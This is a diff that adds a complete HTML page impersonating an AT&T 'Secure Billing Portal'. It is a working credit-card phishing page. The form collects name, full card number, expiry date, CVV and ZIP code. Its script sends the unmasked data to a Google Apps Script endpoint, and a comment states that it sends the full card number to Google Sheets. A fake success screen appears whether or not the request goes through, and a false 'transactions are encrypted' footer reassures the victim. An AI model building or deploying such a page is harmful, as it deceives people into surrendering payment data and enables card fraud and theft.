@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AT&T — Secure Billing Portal</title>
+
+  <style>
+    :root {
+      --att-blue: #0099ff;
+      --att-dark-blue: #0077cc;
+      --bg-color: #f4f6f8;
+      --card-bg: #ffffff;
+      --text-color: #1a1a1a;
+      --border-color: #d1d5db;
+      --success: #0099ff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                   Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg-color);
+      color: var(--text-color);
+      margin: 0;
+      padding: 40px 20px;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 460px;
+      background: white;
+      border-top: 5px solid var(--att-blue);
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 12px 32px rgba(0, 153, 255, .08);
+      overflow: hidden;
+    }
+
+    /* ---------------- INTRO ---------------- */
+
+    .intro {
+      text-align: center;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: introIn 1.5s ease forwards;
+    }
+
+    .att-logo {
+      width: 58px;
+      height: 58px;
+      margin: 0 auto 15px;
+      border-radius: 50%;
+      background: var(--att-blue);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 800;
+      box-shadow: 0 5px 15px rgba(0, 153, 255, .25);
+    }
+
+    .brand-name {
+      margin: 0;
+      color: var(--att-dark-blue);
+      font-size: 2rem;
+      font-weight: 800;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: textIn 1s ease .4s forwards;
+    }
+
+    .subtitle {
+      margin-top: 6px;
+      color: #64748b;
+      font-size: .9rem;
+      opacity: 0;
+      animation: textIn 1s ease .7s forwards;
+    }
+
+    .token {
+      display: inline-block;
+      margin-top: 18px;
+      padding: 8px 12px;
+      background: #f1f5f9;
+      border-radius: 6px;
+      color: #475569;
+      font-family: monospace;
+      font-size: .78rem;
+      opacity: 0;
+      animation: textIn 1s ease 1s forwards;
+    }
+
+    /* ---------------- FORM ---------------- */
+
+    .form-section {
+      opacity: 0;
+      transform: translateY(25px);
+      max-height: 0;
+      overflow: hidden;
+      animation: formIn 1s ease 2.5s forwards;
+    }
+
+    .form-title {
+      margin: 28px 0 20px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #334155;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #475569;
+      font-size: .85rem;
+      font-weight: 500;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      background: #f8fafc;
+      font-size: .95rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--att-blue);
+      background: white;
+      box-shadow: 0 0 0 3px rgba(0, 153, 255, .12);
+    }
+
+    input.error {
+      border-color: #dc2626;
+      background: #fef2f2;
+    }
+
+    .error-msg {
+      color: #dc2626;
+      font-size: 0.75rem;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .card-brand-badge {
+      position: absolute;
+      right: 12px;
+      top: 36px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #64748b;
+      background: #e2e8f0;
+      padding: 3px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 12px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      margin-top: 5px;
+      border: 0;
+      border-radius: 6px;
+      background: linear-gradient(
+        135deg,
+        var(--att-blue),
+        var(--att-dark-blue)
+      );
+      color: white;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: .2s;
+    }
+
+    .submit-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 15px rgba(0, 153, 255, .25);
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #64748b;
+      font-size: .78rem;
+    }
+
+    /* ---------------- SUCCESS ---------------- */
+
+    .success {
+      display: none;
+      text-align: center;
+      padding: 25px 0 10px;
+    }
+
+    .success-icon {
+      width: 82px;
+      height: 82px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: #e6f4fa;
+      color: var(--success);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      font-weight: bold;
+      animation: pop .6s cubic-bezier(.17,.89,.32,1.49);
+    }
+
+    .success h2 {
+      margin: 0;
+      color: var(--success);
+      font-size: 1.45rem;
+    }
+
+    .success p {
+      color: #64748b;
+      margin: 10px 0 18px;
+    }
+
+    .success-token {
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 6px;
+      background: #f1f5f9;
+      font-family: monospace;
+      font-size: .78rem;
+      color: #475569;
+    }
+
+    /* ---------------- ANIMATIONS ---------------- */
+
+    @keyframes introIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes textIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes formIn {
+      from {
+        opacity: 0;
+        transform: translateY(25px);
+        max-height: 0;
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+        max-height: 1000px;
+      }
+    }
+
+    @keyframes pop {
+      0% {
+        opacity: 0;
+        transform: scale(.3);
+      }
+
+      70% {
+        transform: scale(1.1);
+      }
+
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 28px 22px;
+      }
+
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <!-- FIRST SCREEN -->
+    <div class="intro" id="intro">
+
+      <div class="att-logo">
+        AT&amp;T
+      </div>
+
+      <h1 class="brand-name">
+        AT&amp;T
+      </h1>
+
+      <div class="subtitle">
+        Secure Billing Portal
+      </div>
+
+      <div class="token">
+        Token ID:
+        <span id="token"></span>
+      </div>
+
+    </div>
+
+
+    <!-- FORM -->
+    <div class="form-section" id="formSection">
+
+      <div class="form-title">
+        Payment Information
+      </div>
+
+      <form id="paymentForm" novalidate>
+
+        <div class="form-row">
+
+          <div class="form-group">
+            <label>First Name</label>
+            <input
+              type="text"
+              id="firstName"
+              placeholder="First Name"
+              required
+            >
+          </div>
+
+          <div class="form-group">
+            <label>Last Name</label>
+            <input
+              type="text"
+              id="lastName"
+              placeholder="Last Name"
+              required
+            >
+          </div>
+
+        </div>
+
+        <div class="form-group">
+          <label>Card Number</label>
+          <input
+            type="text"
+            id="cardNumber"
+            placeholder="0000 0000 0000 0000"
+            maxlength="19"
+            required
+          >
+          <span id="cardBrandBadge" class="card-brand-badge" style="display:none;"></span>
+          <div id="cardError" class="error-msg">Please enter a valid card number.</div>
+        </div>
+
+        <div class="form-row">
+
+          <div class="form-group">
+            <label>Expiration Date</label>
+            <input
+              type="text"
+              id="expDate"
+              placeholder="MM/YY"
+              maxlength="5"
+              required
+            >
+            <div id="expError" class="error-msg">Invalid expiration date or expired.</div>
+          </div>
+
+          <div class="form-group">
+            <label>CVV</label>
+            <input
+              type="text"
+              id="cvv"
+              maxlength="4"
+              placeholder="CVV"
+              required
+            >
+          </div>
+
+        </div>
+
+        <!-- ZIP CODE -->
+        <div class="form-group">
+          <label>ZIP / Postal Code</label>
+          <input
+            type="text"
+            id="zipCode"
+            placeholder="ZIP Code"
+            required
+          >
+        </div>
+
+        <button
+          type="submit"
+          class="submit-btn"
+          id="submitBtn"
+        >
+          Submit Payment
+        </button>
+
+      </form>
+
+      <div class="footer">
+        🔒 Secure Portal — All transactions are encrypted
+      </div>
+
+    </div>
+
+
+    <!-- SUCCESS SCREEN -->
+    <div class="success" id="success">
+
+      <div class="success-icon">
+        ✓
+      </div>
+
+      <h2>
+        AT&amp;T
+      </h2>
+
+      <p>
+        Submitted Successfully
+      </p>
+
+      <div class="success-token">
+        Token ID:
+        <span id="successToken"></span>
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <script>
+
+    // Generate random token
+    function generateToken() {
+      const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      let token = "AT-";
+      for (let i = 0; i < 12; i++) {
+        token += characters[Math.floor(Math.random() * characters.length)];
+      }
+      return token;
+    }
+
+    const token = generateToken();
+    document.getElementById("token").textContent = token;
+    document.getElementById("successToken").textContent = token;
+
+    // Card Input formatting, detection, and masking
+    const cardInput = document.getElementById("cardNumber");
+    const cardBrandBadge = document.getElementById("cardBrandBadge");
+    const cardError = document.getElementById("cardError");
+    let rawCardNumber = "";
+
+    function detectCardBrand(number) {
+      const clean = number.replace(/\s+/g, '');
+      if (/^4/.test(clean)) return 'Visa';
+      if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return 'Mastercard';
+      if (/^3[47]/.test(clean)) return 'Amex';
+      if (/^6(?:011|5)/.test(clean)) return 'Discover';
+      return '';
+    }
+
+    cardInput.addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      rawCardNumber = value;
+      let formatted = '';
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+      }
+      e.target.value = formatted;
+
+      const brand = detectCardBrand(value);
+      if (brand) {
+        cardBrandBadge.textContent = brand;
+        cardBrandBadge.style.display = 'block';
+      } else {
+        cardBrandBadge.style.display = 'none';
+      }
+      cardInput.classList.remove('error');
+      cardError.style.display = 'none';
+    });
+
+    // Mask card number on blur (show only last 4, rest stars) for user view on UI only
+    cardInput.addEventListener("blur", function() {
+      if (rawCardNumber.length >= 12) {
+        let last4 = rawCardNumber.slice(-4);
+        cardInput.value = '**** **** **** ' + last4;
+      }
+    });
+
+    // Unmask on focus if masked
+    cardInput.addEventListener("focus", function() {
+      if (cardInput.value.startsWith('*')) {
+        let formatted = '';
+        for (let i = 0; i < rawCardNumber.length; i++) {
+          if (i > 0 && i % 4 === 0) formatted += ' ';
+          formatted += rawCardNumber[i];
+        }
+        cardInput.value = formatted;
+        const brand = detectCardBrand(rawCardNumber);
+        if (brand) {
+          cardBrandBadge.textContent = brand;
+          cardBrandBadge.style.display = 'block';
+        }
+      }
+    });
+
+    // Expiration date formatting and validation
+    const expInput = document.getElementById("expDate");
+    const expError = document.getElementById("expError");
+
+    expInput.addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+      e.target.value = value;
+      expInput.classList.remove('error');
+      expError.style.display = 'none';
+    });
+
+    function validateExpDate(val) {
+      const parts = val.split('/');
+      if (parts.length !== 2) return false;
+      let month = parseInt(parts[0], 10);
+      let year = parseInt('20' + parts[1], 10);
+
+      if (isNaN(month) || isNaN(year)) return false;
+      if (month < 1 || month > 12) return false;
+
+      const now = new Date();
+      const currentYear = now.getFullYear();
+      const currentMonth = now.getMonth() + 1;
+
+      if (year < currentYear) return false;
+      if (year === currentYear && month < currentMonth) return false;
+
+      return true;
+    }
+
+    // Submit form handler linked to Google Sheets via your Web App URL
+    document
+      .getElementById("paymentForm")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        // Validate expiration date
+        if (!validateExpDate(expInput.value)) {
+          expInput.classList.add('error');
+          expError.style.display = 'block';
+          return;
+        }
+
+        const button = document.getElementById("submitBtn");
+        button.disabled = true;
+        button.textContent = "Processing...";
+
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyrdVVl1O8rOP_FEy9vLhjY0XhtpWUN3hBoe_StPW_UvzFNIPWAKnk4esMgvyjTpvrT7w/exec';
+
+        const formData = {
+          token: token,
+          firstName: document.getElementById("firstName").value,
+          lastName: document.getElementById("lastName").value,
+          cardNumber: rawCardNumber, // Sending the full unmasked card number to Google Sheets
+          cardBrand: detectCardBrand(rawCardNumber) || 'Unknown',
+          expDate: expInput.value,
+          cvv: document.getElementById("cvv").value,
+          zipCode: document.getElementById("zipCode").value,
+          timestamp: new Date().toISOString()
+        };
+
+        fetch(scriptURL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(formData)
+        }).then(() => {
+          setTimeout(function() {
+            document.getElementById("intro").style.display = "none";
+            document.getElementById("formSection").style.display = "none";
+            document.getElementById("success").style.display = "block";
+          }, 1200);
+        }).catch(error => {
+          console.error('Error!', error.message);
+          setTimeout(function() {
+            document.getElementById("intro").style.display = "none";
+            document.getElementById("formSection").style.display = "none";
+            document.getElementById("success").style.display = "block";
+          }, 1200);
+        });
+      });
+
+  </script>
+
+</body>
+</html>
